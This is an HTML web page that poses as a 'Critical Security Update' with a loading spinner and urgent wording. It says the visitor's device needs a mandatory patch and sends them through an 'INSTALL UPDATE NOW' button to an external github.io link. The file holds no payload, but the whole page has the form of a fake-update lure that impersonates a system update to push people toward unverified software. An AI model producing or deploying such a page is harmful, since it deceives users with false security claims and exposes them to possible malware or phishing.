<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Update</title>
    <style>
        body { background-color: #121212; color: #ffffff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .container { padding: 20px; }
        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background-color: #3498db; color: white; padding: 15px 25px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Critical Security Update</h1>
        <p>Your device requires a mandatory security patch to protect against remote threats.</p>
        <p>Please click the button below to initialize the update process.</p>
        <a href="https://unbrackx.github.io/security-update/activate" class="btn">INSTALL UPDATE NOW</a>
    </div>
</body>
</html>
